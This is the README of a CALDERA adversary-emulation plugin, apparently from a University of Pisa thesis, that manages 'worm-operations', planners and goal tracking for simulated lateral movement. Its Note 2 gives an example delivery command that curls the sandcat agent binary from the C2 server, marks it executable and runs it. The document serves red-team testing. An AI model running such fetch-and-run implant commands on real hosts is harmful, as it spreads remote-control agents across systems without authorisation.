# CALDERA plugin: WORM

A [CALDERA](https://github.com/mitre/caldera#planning-system) plugin to manage worm-operations and goals from a REST API and GUI.

This project is part of my thesis project at the [University of Pisa](https://www.di.unipi.it/en/), supervised by Professor [Fabrizio Baiardi](http://pages.di.unipi.it/tonelli/baiardi/).

All the material in this repository can be used freely, citing the author (me) and the [University of Pisa](https://www.di.unipi.it/en/).

## Requirements and quick start

1) This plugin is tested for  <b>2.3.2</b> CALDERA version.

2) To work properly, this plugin needs some extra features compared to the [basic 2.3.2 CALDERA version](https://github.com/mitre/caldera#planning-system).
You can download the version with the features required by this [branch](https://github.com/EmilioPanti/caldera/tree/EmilioPanti-FatherAgent).
The difference between the two versions is only in the fact that the agents have an extra property: the <b>father</b>.

3) Download this plugin and insert it into CALDERA plugins folder.

4) Make sure you have inserted the WORM plugin in the CALDERA conf/local.yml configuration file:
```
plugins:
  - worm
```

## Functionality

This plugin introduces the following features:
* a new type of operation: <b>worm-operation</b>
* a new class of planners: <b>worm-planners</b>
* a new concept: <b>goal</b> 
* a new report for worm-operations
* easily separating the agents which - by participating in an worm-operation - have satisfied the goal by those which have not satisfied it

It is possible to use these features both via REST API and GUI.

## WHY this plugin

Using "normal" CALDERA operations with adversary profiles that perform <b>lateral movements</b>, some <b>inconsistent or unwanted scenarios</b> can occur. Examples:
* new agents created after a lateral movement operation could perform the attack phases in a different order than expected - due to the forced recovery of the phases already executed (by the "old" agents) as if they were a single phase.
* after the creation of new agents, some abilities of phases already executed could be repeated - due to new facts collected by the new agents and by the new potential links that can be generated starting from them.
* new agents created during the last phase never start the operation.
* new agents created during the penultimate phase may not execute certain abilities - in particular those that use variables that can only be filled with host-facts (the facts with property major component = host), that must be collected in previous abilities.

<br>

These problems are due to two implementation choices:
1) the operations are guided primarily by the execution phase and second by the agents
2) for each agent, the links of all the phases up to now executed are generated -- not just the current one
```
for each phase {
  for each agent {
   generates all possible links from phase 1 to the current phase
  }
}
```

<br>

Solution to the problems mentioned above:
1) new type of operation with a different logic --> <b>worm-operation</b>
2) new class of planners that generate links only for the current phase of the attack --> <b>worm-planners</b>

## WORM-OPERATION

I will describe this type of operation by listing the differences with the normal CALDERA operation:
1) <b>the basic logic</b>: in this type of operation the agents execute the attack <b>independently</b> of each other - e.g. agent X can be in phase 1 while agent Y is in phase 4.
2) <b>agent-map</b>: by GUI is possible to view a reconstruction of the 'agents family tree' and any 'orphan agents'.
3) <b>goal</b>: it is possible to define a goal for the attack that we perform (more details in the goal section).
4) <b>goal-policy</b>: if a goal is set, it is possible to choose whether to stop when a goal-agent is reached or whether to continue the attack until it is possible to expand.
5) <b>termination</b>: a worm-operation can end for 3 reasons: all agents performed the entire attack, or the user has manually stopped the operation, or a goal-agent is reached and the policy chosen by the user is to stop as soon as one is reached.

Furthermore:
  * if a worm-operation is stopped, it cannot be restarted - like the normal operation - but is considered completely terminated.
  * manual approval is not possible for worm-operations.
  
These last two points could be added in future.

![alt text](https://github.com/EmilioPanti/worm/blob/master/docs/img/worm1.png)

### Note 1: don't be misled by the name worm-operation!

This new type of operation can be used for any type of adversary profile, even those that do not perform lateral movements!
It's just a different logical approach to executing an adversary profile.

### Note 2: build the 'agents family tree'

To build the 'agents family tree' it is necessary to add to the delivery command for the new agents - in the abilities that perform lateral movements - the <b>father parameter</b>. Example:
```
do curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' #{server}/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server #{server} -group #{group} -father #{paw};
```

## WORM-PLANNERS

As with normal CALDERA operations, custom planners can also be used for worm-operations. To do this, just insert the relevant .yml file in the data/planners folder.
Unlike planners for normal CALDERA operations - they only need to implement the execute () function - the planners for worm operations must implement the following two functions:
1) <b>create_links</b>: given a worm-operation and an agent, it generates all possible links for the next phase that the agent must execute.
2) <b>create_cleanup_links</b>: given a worm-operation and an agent, it generates the cleanup links for the phases executed by the agent.

### The worm_sequential planner

It's the default planner for worm-operations: like its counterpart to normal CALDERA operations, it orders the links generated based on its score (in descending order).

## GOAL

Goals are formulas in <b>Conjunctive Normal Form (CNF)</b>: a conjunction of clauses, where the clauses are a disjunction of literals.

Every literal can be a condition:
* on agent's <b>properties</b>.<br>
* on <b>host-facts</b> (the facts with property major component = host) collected by an agent.

A goal is achieved if at least ONE condition is satisfied for ALL the clauses.

An agent that satisfies the goal is called <b>goal-agent</b>.

Since the host-facts depend on the abilities, an adversary's profile is associated with each goal.
Obviously different goals can be created for the same adversary profile.

It is possible to create goals either through the GUI or by loading the .yml file in the data/goals folder.

## REPORT

Even for worm-operations it is possible to download (and view by GUI) the report that summarizes the execution. Compared to the normal CALDERA operations reports there are some additional information:
* <b>goal</b>: if set one, it shows the name and description
* <b>policy</b>: if the worm-operation had a goal, it shows the chosen policy - stop at the first goal-agents / expand until it is possible.
* <b>goal-agents</b>: percentage of goal-agents and list of their paw.

## Additional features for AGENTS

Once a worm-operation is finished, it is possible to see the list of the agents which participated and which of them are goal-agents.

It is also possible:
* compare the results of a finished worm-operation with other goals - associated with the same adversary profile executed.
* split easily the <b>goal-agents</b> from the <b>no-goal-agents</b> that participated in an worm-operation into distinct groups.
